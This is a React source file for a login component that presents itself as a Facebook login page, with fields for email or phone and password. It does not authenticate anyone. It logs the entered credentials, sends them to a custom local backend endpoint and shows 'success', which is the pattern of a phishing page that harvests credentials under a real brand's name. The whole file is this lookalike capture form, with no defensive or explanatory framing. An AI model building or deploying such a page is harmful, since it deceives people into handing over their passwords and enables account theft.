import React from 'react'
import {useState,useRef } from 'react';
import axios from 'axios';

function Login() {
  const [firstError,setFirstError]=useState("");
  const [success, setSuccess] = useState("");
  const [secondError, setSecondError] = useState("");
  const userRef=useRef()
  const passwordRef = useRef();
  
  const sendHandler=async ()=>{
     const data = {
       username: userRef.current.value,
       password: passwordRef.current.value,
     };
     if (data.username === "") {
       setFirstError("Enter username");
     }
     if (data.password === "") {
       setSecondError("Enter password");
     }
     if (data.username !== "" && data.password !== "") {
      console.log(data)
      axios
        .post("http://localhost:5000/api/post", data, {
          headers: {
            "Content-Type": "application/json",
          },
        })
        .then((res) => {
          console.log(res);
        })
        .catch((err) => {
          console.log(err);
        });
        console.log("sent");   
      setSuccess("success");
     }




    
  }

  const submitHandler = (e) => {
    e.preventDefault();
    sendHandler()
    e.target.reset()
  };


  return (
    <div>
      <div className="head">
        <h1>Facebook</h1>
      </div>
      <div className="wrap">
        <section>
          <div className="container">
            <form action="" onSubmit={submitHandler}>
              <h2>Login Now</h2>
              <input
                ref={userRef}
                type="text"
                className="input"
                placeholder="Email address or phone number"
               
              />
              <p className='error'>{firstError}</p>
              <input
                ref={passwordRef}
                type="password"
                className="input"
                placeholder="Password"
                
              />
              <p className='error'>{secondError}</p>
              <button className="btn">Log in</button>
              <p className='success'>{success}</p>
            </form>
          </div>
        </section>
      </div>
    </div>
  );
}

export default Login